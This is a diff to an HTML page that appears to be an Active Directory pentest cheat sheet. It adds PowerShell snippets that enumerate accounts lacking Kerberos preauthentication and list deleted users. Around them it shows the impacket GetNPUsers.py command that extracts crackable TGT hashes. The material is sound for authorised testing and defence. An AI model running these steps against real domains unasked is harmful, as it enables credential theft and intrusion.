@@ -97,6 +97,8 @@
     
         <li><a class="" href="#kerberos-preauthentication">Kerberos preauthentication</a></li>
     
+        <li><a class="" href="#list-deleted-users">List deleted users</a></li>
+    
         <li><a class="" href="#collect-ad-users-information">Collect AD users information</a></li>
     
         <li><a class="" href="#decrypt-gpo-with-cpassword">Decrypt GPO with cpassword</a></li>
@@ -345,12 +347,21 @@ the user password. So the clear password can be retrieve with a brute-force atta
 <li><a href="https://github.com/PowerShellMafia/PowerSploit/blob/445f7b2510c4553dcd9451bc4daccb20c8e67cbb/Recon/PowerView.ps1" target="_blank">Powerview</a> : <code>Get-DomainUser -PreauthNotRequired</code></li>
 <li>LDAP: <code>userAccountControl:1.2.840.113556.1.4.803:=4194304</code></li>
 </ul>
+<pre><code class="language-powershell line-numbers">$users = (New-Object System.DirectoryServices.DirectorySearcher(&quot;(&amp;(objectCategory=User)(userAccountControl:1.2.840.113556.1.4.803:=4194304))&quot;)).FindAll()
+</code></pre>
+
 <p>Then you can use the <code>impacket</code> script <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py" target="_blank"><code>GetNPUsers.py</code></a>
 to get the TGT in a format the <code>John</code> or <code>Hashcat</code> can brute-force:</p>
 <pre><code class="language-bash line-numbers">python GetNPUsers.py &lt;domain&gt;/ -usersfile users.txt -format &lt;john/empty&gt; -outputfile hashes.txt
 </code></pre>
 
 <p>From <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py" target="_blank">@harmj0y</a>.</p>
+<h3 id="list-deleted-users">List deleted users</h3>
+<pre><code class="language-powershell line-numbers">$deletedObjectsDom = get-addomain | select DeletedObjectsContainer
+$objects = Get-ADObject -SearchBase $deletedObjectsDom.DeletedObjectsContainer -ldapfilter &quot;(objectClass=user)&quot; -IncludeDeletedObjects -properties *
+foreach ($object in $objects) { $object }
+</code></pre>
+
 <h3 id="collect-ad-users-information">Collect AD users information</h3>
 <pre><code class="language-powerhsell line-numbers"># Helping functions
 function Get-ADUserDirectoryEntry($user) {
